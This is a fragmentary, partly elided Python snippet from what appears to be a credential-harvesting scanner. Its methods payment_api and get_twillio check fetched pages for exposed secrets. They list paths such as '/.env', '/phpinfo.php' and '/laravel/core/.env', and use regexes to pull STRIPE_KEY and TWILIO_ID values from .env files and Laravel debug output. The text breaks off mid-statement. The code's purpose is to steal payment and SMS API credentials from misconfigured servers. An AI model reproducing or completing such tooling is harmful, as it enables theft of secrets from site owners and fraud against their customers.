	...
	def payment_api(self, text, url):
		if "PAYPAL_" in text:
			...
			if "STRIPE_KEY=" in text:
				method = '/.env' 'phpinfo.php' '/public/.env' '/dev/.env' '/app/.env' '/staging/.env' '/backend/.env' '/static/.env.example' '/_profiler/phpinfo' '/phpinfo' '/laravel/core/.env'
				try:
					stripe_key = reg('\nSTRIPE_KEY=(.*?)\n', text)[0]
				except:
					stripe_key = ''
	...
	def get_twillio(self, text, url):
		try:
			if "TWILIO" in text:
				...
				save2.close()
				return True
			elif "TWILIO_ID" in text:
				if "TWILIO_ID=" in text:
					method = '/.env' 'phpinfo.php' '/public/.env' '/dev/.env' '/app/.env' '/staging/.env' '/backend/.env' '/static/.env.example' '/_profiler/phpinfo' '/phpinfo' '/laravel/core/.env'
					try:
						acc_sid = reg('\nTWILIO_ID=(.*?)\n', text)[0]
					except:
					...
					try:
						...
						phone = ''
				elif "<td>TWILIO_ID</td>" in text:
					method = 'debug'
					try:
						acc_sid = reg('<td>TWILIO_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						acc_sid = ''
					try:
